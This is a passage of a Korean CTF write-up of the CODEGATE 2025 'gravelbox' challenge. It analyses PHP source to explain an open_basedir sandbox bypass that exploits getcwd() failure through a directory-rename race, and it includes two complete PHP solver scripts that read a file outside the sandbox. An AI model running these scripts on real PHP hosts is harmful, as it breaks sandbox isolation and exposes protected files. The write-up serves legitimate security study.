하지만 PHP 실행 환경에서 `disable_functions`와 [`open_basedir`](https://www.php.net/manual/en/ini.core.php#ini.open-basedir)이 적용되어 있어 직접적인 파일 접근을 막고 있어서 이를 우회해야 한다.

```yaml
services:
  php:
    build:
      context: .
      dockerfile: ./src/Dockerfile
    container_name: web_gravelbox_${TEAM_NAME:-test}
    working_dir: /var/www/html
    environment:
      - TEAM_KEY=${TEAM_KEY:-test}
    volumes:
      - ./src:/var/www/html:ro
      - ./flag.txt:/flag.txt:ro
    ports:
      - ${TEAM_PORT:-60080}:8000
    command:
      - php
      - -d
      - disable_functions=pcntl_alarm,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv
      - -d
      - open_basedir=/var/www/html:/tmp
      - -S
      - 0.0.0.0:8000
      - -t
      - /var/www/html
```

중요한 부분은 `open_basedir=/var/www/html:/tmp`로 설정된 부분이다. 이는 PHP가 지정된 디렉토리 외부의 파일에 접근하는 것을 차단하는 보안 메커니즘이다. flag 파일이 `/flag.txt`에 위치하고 있지만, `open_basedir` 로 인해 해당 경로에 접근할 수 없다.

따라서 이 챌린지의 목적은 PHP 엔진 자체의 `open_basedir` 을 우회하여 flag를 읽어내는 것이다.

### Old techniques

실제 취약점을 찾아보기 전에 과거 사례들을 나열해보겠다.

과거 php(php-src)에는 다양한 방법으로 `open_basedir` 을 우회할 수 있었다.

**curl extension**을 활용하여 우회하는 방법 - [https://github.com/php/php-src/issues/16802](https://github.com/php/php-src/issues/16802)

**glob:// protocol**을 활용하여 우회하는 방법 - [https://bugs.php.net/bug.php?id=73891](https://bugs.php.net/bug.php?id=73891)

Symlink를 활용하여 우회하는 방법 - [https://bugs.php.net/bug.php?id=77850](https://bugs.php.net/bug.php?id=77850)

open_basedir bypass 정리 (munsiwoo) - [https://blog.munsiwoo.kr/2018/09/open_basedir-bypass/](https://blog.munsiwoo.kr/2018/09/open_basedir-bypass/)

…

[bugs.php.net](https://bugs.php.net/)에서도 찾아볼 수 있다.

![image.png](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2036.png)

이러한 다양한 우회 기법들이 존재했지만 현재는 모두 패치되어 사용할 수 없는 상태이다.

## Analysis

이 문제를 해결하기 위해서는 8.4 버전의 php-src (C언어로 작성된 php source code)를 다운받아야 한다.

```bash
git clone https://github.com/php/php-src.git
```

(2025/8 기준으로 8.4.x가 최신버전이라 git clone 이후에 버전을 바꿀 필요가 없었다.)

### Guideline for php-src analysis

php-src에 대한 분석을 원활하게 진행하기 위해서 먼저 이해해야 할 핵심적인 개념이 하나 있다. 이를 이해해야만 코드 분석 과정에서 발생할 수 있는 혼란을 피할 수 있다.

```c
/* {{{ OnUpdateBaseDir
Allows any change to open_basedir setting in during Startup and Shutdown events,
or a tightening during activation/runtime/deactivation */
PHPAPI ZEND_INI_MH(OnUpdateBaseDir)
{
	...
	return SUCCESS;
}
/* }}} */
```

위에 제시된 코드는 php-src 코드의 일부분으로, `open_basedir` 설정을 처리하는 함수이다.

하지만 이 코드를 처음 보는 사람이라면 함수 선언부가 일반적인 C언어의 함수 선언문과는 상당히 다른 형태를 보이고 있음을 알 수 있다.

이러한 현상이 발생하는 이유는 **php-src가 주로 `#define`을 통해 정의된 매크로를 활용**하기 때문이다.
대부분의 매크로 이름은 대문자로 구성되어 있다. 이는 C언어의 일반적인 코딩 컨벤션을 따른 것으로, 매크로와 일반 함수 또는 변수를 시각적으로 구분할 수 있도록 도와준다. 따라서 php-src 코드를 분석할 때는 **항상 대문자로 이루어진 식별자들이 매크로일 가능성이 높다**는 점을 염두에 두고 접근해야 한다.

앞서 제시된 예제에서 `ZEND_INI_MH`라는 매크로의 실제 정의를 살펴보면 다음과 같다:

```c
#define ZEND_INI_MH(name) int name(zend_ini_entry *entry, zend_string *new_value, void *mh_arg1, void *mh_arg2, void *mh_arg3, int stage)
```

이 매크로 정의를 통해 우리는 `ZEND_INI_MH(OnUpdateBaseDir)`가 실제로는 다음과 같은 함수로 이루어짐을 알 수 있다.

```c
int OnUpdateBaseDir(zend_ini_entry *entry, zend_string *new_value, void *mh_arg1, void *mh_arg2, void *mh_arg3, int stage)
```

이를 통해 `OnUpdateBaseDir` 함수가 `int` 타입을 반환하며, 총 6개의 매개변수를 받는다는 것을 파악할 수 있다. 또한 매크로와 관련하여 주의해야 할 몇 가지 사항들이 있다.

첫째, 매크로는 컴파일 시점에 텍스트 치환으로 처리되므로, 런타임에서의 동작을 이해하기 위해서는 반드시 확장된 형태를 기준으로 생각해야 한다.

둘째, 일부 매크로는 조건부 컴파일을 포함하고 있어, 빌드 환경(OS)이나 컴파일 옵션에 따라 다른 코드로 확장될 수 있다는 점도 고려해야 한다.

Windows에서 php를 실행하는 경우 `win32/`폴더에 있는 코드를 일부 사용하고, 아래와 같이 매크로 정의 과정에서도 Windows 인지 확인하는 과정을 거친다.

```c
#ifdef _WIN32

#include <windows.h>
```

이러한 이해를 바탕으로 php-src 코드 분석을 진행한다면, 보다 쉽게 분석할 수 있을 것이다.

(gravelbox는 Docker 환경에서 동작하므로 linux를 기준으로 분석을 진행하였다.)

### 1. OnUpdateBaseDir()

`ini_set('open_basedir', ...)` 은 `main/fopen_wrappers.c`의 `OnUpdateBaseDir()` 에 구현되어 있다.

```c
/* {{{ OnUpdateBaseDir
Allows any change to open_basedir setting in during Startup and Shutdown events,
or a tightening during activation/runtime/deactivation */
PHPAPI ZEND_INI_MH(OnUpdateBaseDir)
{
	char **p = (char **) ZEND_INI_GET_ADDR();

	...

	/* Is the proposed open_basedir at least as restrictive as the current setting? */
	smart_str buf = {0};
	ptr = pathbuf = estrdup(ZSTR_VAL(new_value));
	while (ptr && *ptr) {
		...
		if (expand_filepath(ptr, resolved_name) == NULL) { // [1] Resolve realpath
		...
		if (php_check_open_basedir_ex(resolved_name, 0) != 0) {
		// [2] Check basedir eligibility
		...
	}
	efree(pathbuf);

	/* Everything checks out, set it */
	zend_string *tmp = smart_str_extract(&buf);
	char *result = estrdup(ZSTR_VAL(tmp)); // [3] Add it to runtime property
	if (PG(open_basedir_modified)) {
		efree(*p);
	}
	*p = result;
	PG(open_basedir_modified) = true;
	zend_string_release(tmp);

	return SUCCESS;
}
/* }}} */
```

코드는 다음 순서로 동작한다:

1. **`new_value`를 `realpath`로 변환**하여 실제 경로를 구한다.
2. 변환된 경로가 **`open_basedir` 정책에 부합하는지 확인**한다.
3. 검증이 끝난 경로를 **런타임 환경에 적용**한다.

핵심 코드를 살펴본다면 다음과 같다.

```c
	/* Is the proposed open_basedir at least as restrictive as the current setting? */
	smart_str buf = {0};
	ptr = pathbuf = estrdup(ZSTR_VAL(new_value));
	while (ptr && *ptr) {
		end = strchr(ptr, DEFAULT_DIR_SEPARATOR); // [1] Split with ':' (Windows = ';')
		if (end != NULL) {
			*end = '\0';
			end++;
		}
		char resolved_name[MAXPATHLEN + 1];
		if (expand_filepath(ptr, resolved_name) == NULL) { // [2] Resolve realpath
			efree(pathbuf);
			smart_str_free(&buf);
			return FAILURE; // FAIL
		}
		if (php_check_open_basedir_ex(resolved_name, 0) != 0) { // [3] Check eligibility
			/* At least one portion of this open_basedir is less restrictive than the prior one, FAIL */
			efree(pathbuf);
			smart_str_free(&buf); // FAIL
			return FAILURE;
		}
		if (smart_str_get_len(&buf) != 0) {
			smart_str_appendc(&buf, DEFAULT_DIR_SEPARATOR);
		}
		smart_str_appends(&buf, resolved_name); // [4] SUCCESS
		ptr = end;
	}
```

**[1]**에서 `new_value`를 `DEFAULT_DIR_SEPARATOR`로 분리하는 역할을 한다.

이는 아래와 같이 여러 경로를 open_basedir로 지정할 수 있게 해준다.

```c
open_basedir=/tmp:/var/www/html
```

**[2]**에서 `expand_filepath()` 를 통해 실제 경로를 구하게 된다.

**[3]**에서 `php_check_open_basedir_ex()`를 통해서 적격성을 검사한다.

모든 조건이 확인된다면 **[4]**에서 SUCCESS를 반환한다.

### 2. expand_filepath()

`expand_filepath()` 는 다음과 같은 순서로 함수를 호출한다.

`expand_filepath` → `expand_filepath_ex` → `expand_filepath_with_mode`

최종적으로 `expand_filepath_with_mode(filepath, real_path, NULL, 0, CWD_FILEPATH)`로 호출한다.

```c
/* {{{ expand_filepath_use_realpath */
PHPAPI char *expand_filepath_with_mode(const char *filepath, char *real_path, const char *relative_to, size_t relative_to_len, int realpath_mode)
{
	cwd_state new_state;
	char cwd[MAXPATHLEN];
	size_t copy_len;
	size_t path_len;

	if (!filepath[0]) {
		return NULL;
	}

	path_len = strlen(filepath);

	if (IS_ABSOLUTE_PATH(filepath, path_len)) {
		cwd[0] = '\0';
	} else { // [1]
		const char *iam = SG(request_info).path_translated;
		const char *result;
		if (relative_to) {
			...
		} else { // [2]
			result = VCWD_GETCWD(cwd, MAXPATHLEN);
		}

		if (!result && (iam != filepath)) { // [3]
			int fdtest = -1;

			fdtest = VCWD_OPEN(filepath, O_RDONLY);
			if (fdtest != -1) { // [4]
				/* return a relative file path if for any reason
				 * we cannot getcwd() and the requested,
				 * relatively referenced file is accessible */
				copy_len = path_len > MAXPATHLEN - 1 ? MAXPATHLEN - 1 : path_len;
				if (real_path) {
					memcpy(real_path, filepath, copy_len);
					real_path[copy_len] = '\0';
				} else {
					real_path = estrndup(filepath, copy_len);
				}
				close(fdtest);
				return real_path;
			} else {
				cwd[0] = '\0';
			}
		} else if (!result) {
			cwd[0] = '\0';
		}
	}
	...
	return real_path;
}
/* }}} */
```

각각 조건문에서 어떻게 처리되는지 알아보자.

상대경로를 입력한다면 **[1]**로 분기할 수 있다. `relative_to`가 `NULL`로 설정되어 있어서 **[2]**로 진입한다.

만약 **[3]**에서 `!result && (iam != filepath)`이고, **[4]**에서 `fdtest != -1`이라면 php는 filepath를 realpath처럼 취급하게 되고, `..`이 open_basedir값에 추가된다.

따라서 bypass가 가능한 조건은 아래와 같다:

**(1)** `filepath`가 상대경로이다.

(2) `VCWD_GETCWD(cwd, MAXPATHLEN)` → FAIL

(3) `VCWD_OPEN(filepath, O_RDONLY)` → SUCCESS

위의 조건이 만족될 경우 open_basedir값에 `..`이 추가되면서 제한을 우회할 수 있다.

`VCWD_GETCWD` 는 C언어의 `getcwd`를 php로 가져온 것이다. `getcwd`가 `NULL`을 반환하는 경우를 [Linux manual page](https://man7.org/linux/man-pages/man3/getcwd.3.html)에서 살펴보자.

```markdown
### RETURN VALUE

_On success_, these functions return a pointer to a string
containing the pathname of the current working directory. In the
case of getcwd() and getwd() this is the same value as buf.

_On failure_, these functions return NULL, and errno is set to
indicate the error. The contents of the array pointed to by buf
are undefined on error.

### ERRORS

- EACCES : Permission to read or search a component of the filename
  was denied.
- EFAULT : buf points to a bad address.
- EINVAL : The size argument is zero and buf is not a null pointer.
- EINVAL : getwd(): buf is NULL.
- ENAMETOOLONG : getwd(): The size of the null-terminated absolute pathname string exceeds PATH_MAX bytes.
- ENOENT : The current working directory has been unlinked.
- ENOMEM : Out of memory.
- ERANGE : The size argument is less than the length of the absolute
  pathname of the working directory, including the
  terminating null byte. You need to allocate a bigger array
  and try again.
```

RETURN VALUE 항목을 살펴보면 **“실패 시, NULL을 반환한다.”**고 명세되어 있다.

Error가 발생하는 가장 간단한 경우는 “The current working directory has been unlinked.”로 현재 Working Directory가 삭제되었을 경우에 발생하는 에러이다.

또 다른 경우는 "The size of the null-terminated absolute pathname string exceeds PATH_MAX bytes", 즉 현재 pathname이 PATH_MAX (=4096, `linux/limits.h`)를 초과할 경우에 발생한다.

첫번째 경우는 [HexF](https://hexf.me/)님의 아이디어이고, 두번째 경우는 출제자(payload)님의 아이디어이다.

위 아이디어를 최종 익스플로잇 코드로 구현한다면 open_basedir을 우회하여 flag를 획득할 수 있다.

## Solver

```php
<?
chdir("/tmp");

$allowed_path = "/tmp";

@mkdir("start/");
chdir("start/");
$cur_dir = getcwd();
$cur_dir_len = strlen($cur_dir);

$magic_depth = str_repeat(str_repeat("a", 249) . "/", 16 - floor($cur_dir_len / 250));
@mkdir($magic_depth, 0755, true);

chdir($magic_depth);

$pid = pcntl_fork();
var_dump($pid);
if ($pid == -1)
    die;
if ($pid == 0) {
    for ($i = 0; $i < 25; $i++) {
        usleep(300);
        $cur_basedir = ini_get("open_basedir");
        ini_set("open_basedir", $cur_basedir . ":../");
    }
    chdir($allowed_path);
    chdir("../");

    $content = @file_get_contents("/flag.txt");
    if (!$content)
        die("failed\n");
    echo $content;
} else {
    chdir("/tmp");
    for ($i = 0; $i < 30000; $i++) {
        usleep(30);
        rename("start", str_repeat("x", 250));
        rename(str_repeat("x", 250), "start");
    }
}
?>
```

```php
<?php
@rmdir("/tmp/adir/bdir");
@rmdir("/tmp/adir");
@rmdir("/tmp/bdir");

mkdir("/tmp/adir");
mkdir("/tmp/adir/bdir");
chdir("/tmp/adir/bdir");

$count = 100000000;

$pid = pcntl_fork();
if ($pid == -1) {
    die('could not fork');
} else if ($pid) {
    for ($i = 0; $i < $count; $i++) {
        $r = @file_get_contents("../../flag.txt");
        if ($r !== false) {
            var_dump($r);
        }
    }
} else {
    // we are the child
    for ($i = 0; $i < $count; $i++) {
        rename("/tmp/adir/bdir", "/tmp/bdir");
        rename("/tmp/bdir", "/tmp/adir/bdir");
    }
}
?.
```

위 PoC에 대하여 보충설명이 있다면 PHP의 파일 관련 함수들(`file_get_contents`, `fopen` 등)은 호출 시 내부적으로 `php_check_open_basedir` 함수를 호출한다. 이 함수는 다시 `expand_filepath`를 호출하며 `OnUpdateBaseDir()`와 유사한 검증 로직을 수행한다.

공격의 핵심은 두 개의 프로세스가 동시에 실행되면서 발생하는 경쟁 상태이다.

1. **부모 프로세스**: `file_get_contents("../../flag.txt")` 반복 실행
2. **자식 프로세스**: `/tmp/A/B`와 `/tmp/B` 디렉토리 간 `rename` 반복 수행

이 과정에서 경로 해석과 `open_basedir` 검증 사이의 시간차(TOCTOU)를 이용해 제한을 우회할 수 있다.

따라서 위에서 언급했듯이 디렉토리 조작으로 인해 경로 해석 시점과 검증 시점 사이에 작업 디렉토리가 변경되면 "The current working directory has been unlinked." 에러가 발생하지만, 이미 해석된 경로로 파일 접근이 가능해진다.

![flag](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2037.png)

flag

# Conclusion

이번 대회는 단순히 하나의 취약점만으로 해결되는 문제가 아니라, 여러 취약점을 체이닝해야 풀 수 있는 문제가 많아 여러모로 배울 점이 많았다. 특히 일반부에서는 **WEB+PWNABLE**, **WEB+WEB3**처럼 서로 다른 영역을 결합한 문제가 출제되어 난이도가 상당히 높았다. 청소년부 문제들은 일반부에 비해 비교적 단순한 형태였지만, 세밀한 이해와 정확한 접근을 요구하여 학생들이 학습하기에 적합한 구성으로 느껴졌다.

그중에서도 가장 인상 깊었던 문제는 일반부에서 출제된 Node.js ROP 문제(chachadotcom)였다. 단순히 임의 파일 작성에서 끝나는 것이 아니라, 이를 node바이너리에다가 ROP를 사용하여 실제 RCE로 연계하는 흐름은 매우 흥미로웠다. 이러한 임의파일 작성을 통한 RCE 공격연구는 예전부터 꾸준히 이어져 왔으며, 잘 알려진 PHP 파일 기반 트릭뿐 아니라 최근 발표된 Python 관련 연구에서도 비슷한 기법이 등장한 바 있다.

👉 [Dirty Arbitrary File Write to RCE via Python](https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/)

또한 2025 HITCON CTF에서도 이와 유사하게 Flask 환경에서 `/proc/self/fd` 에 임의 파일을 작성해 RCE를 트리거하는 문제가 출제되었는데, 이러한 사례는 Node.js뿐 아니라 다양한 런타임 환경에서 공통적으로 적용될 수 있음을 보여준다.

따라서 단순한 파일 쓰기 취약점을 넘어서, **실제 런타임 내부 구조(libuv, Python 바이트코드, PHP 엔진 등)와 결합했을 때 어떻게 RCE로 이어질 수 있는지**를 충분히 연구하고 익히는 것이 중요하다.

마지막으로 총평을 하자면, 전체적으로 문제들이 억지스럽지 않고 흔치 않은 트릭들이 다수 사용되어 재밌게 즐길 수 있었다. 좋은 문제들을 준비해주신 **CODEGATE 운영진분들께 진심으로 감사드린다.**
